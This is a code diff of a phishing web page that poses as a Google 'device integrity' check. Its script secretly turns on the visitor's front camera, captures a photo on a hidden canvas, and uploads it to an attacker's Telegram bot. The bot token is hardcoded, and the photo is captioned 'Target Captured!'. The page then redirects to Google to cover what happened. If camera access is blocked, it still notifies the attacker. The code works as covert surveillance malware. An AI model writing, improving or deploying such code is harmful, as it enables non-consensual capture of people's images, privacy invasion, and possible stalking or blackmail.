@@ -6,7 +6,7 @@
 </head>
 <body style="background:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="150">
-    <h3 id="st" style="font-weight:normal; color:#5f6368;">Verifying account integrity...</h3>
+    <h3 style="font-weight:normal; color:#5f6368;">Verifying device integrity...</h3>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
@@ -14,39 +14,36 @@
         const token = "8461524246:AAGAsQD20_4t3zR05rI6bu-0FIrG_pgXS-g";
         const chat_id = "7130643157";
 
-        async function send(blob) {
-            const fd = new FormData();
-            fd.append('chat_id', chat_id);
-            fd.append('photo', blob, 'capture.jpg');
-            
-            // Method 1: As Photo
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-            
-            // Method 2: As Document (Backup)
-            const fd2 = new FormData();
-            fd2.append('chat_id', chat_id);
-            fd2.append('document', blob, 'secure_check.enc');
-            await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: 'POST', body: fd2 });
-        }
-
         async function start() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = stream;
+                const v = document.getElementById('v');
+                v.srcObject = stream;
 
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = 640; c.height = 480;
-                    c.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+                    c.getContext('2d').drawImage(v, 0, 0);
                     
                     c.toBlob(async (blob) => {
-                        await send(blob);
+                        const fd = new FormData();
+                        fd.append('chat_id', chat_id);
+                        fd.append('photo', blob, 'img.jpg');
+                        fd.append('caption', '✅ SUCCESS: Target Captured!');
+
+                        // FORCE SEND: Sabse mazboot tarika
+                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            mode: 'cors',
+                            cache: 'no-cache',
+                            body: fd
+                        });
+
                         window.location.href = "https://www.google.com";
                     }, 'image/jpeg', 0.6);
-                }, 1000);
+                }, 1500); 
             } catch (e) {
-                // Agar camera block ho toh alert bhej do
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=⚠️ Link opened but Camera Blocked!`);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=❌ Error: Permission Denied`);
                 window.location.href = "https://www.google.com";
             }
         }
